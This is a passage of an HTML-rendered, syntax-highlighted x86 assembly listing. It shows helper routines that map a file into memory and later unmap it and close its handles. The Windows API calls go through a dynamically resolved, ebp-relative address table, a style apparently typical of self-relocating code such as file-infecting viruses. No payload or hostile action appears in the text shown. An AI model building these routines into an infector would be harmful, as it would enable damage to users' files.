            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aCreateFileMapping</span><span class="sc0"> </span><span class="sc1">; CreateFileMapping</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">MapBadEnd</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.hFileMap</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; hFileMap</span><span class="sc0">
    
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_ALL_ACCESS</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aMapViewOfFile</span><span class="sc0"> </span><span class="sc1">; MapViewOfFile</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">MapBadEnd</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrMappedImage</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">MapBadEnd</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapFile</span><span class="sc0">
</span><span class="sc5">MapBadEnd2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
            </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                            unmap file                     ;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">UnmapFile</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pushad</span><span class="sc0"> 
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrMappedImage</span><span class="sc0"> </span><span class="sc1">; ptrMappedImage </span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aUnmapViewOfFile</span><span class="sc0"> </span><span class="sc1">; UnmapViewOfFileEx</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.hFileMap</span><span class="sc0"> </span><span class="sc1">; hFileMap</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aCloseHandle</span><span class="sc0">  </span><span class="sc1">; CloseHandle</span><span class="sc0">
        
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.hFile</span><span class="sc0"> </span><span class="sc1">; hFile </span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aCloseHandle</span><span class="sc0">  </span><span class="sc1">; CloseHandle</span><span class="sc0">
                
            </span><span class="sc6">popad</span><span class="sc0"> 
            </span><span class="sc6">retn</span><span class="sc0">                
</span></div></body>
</html>
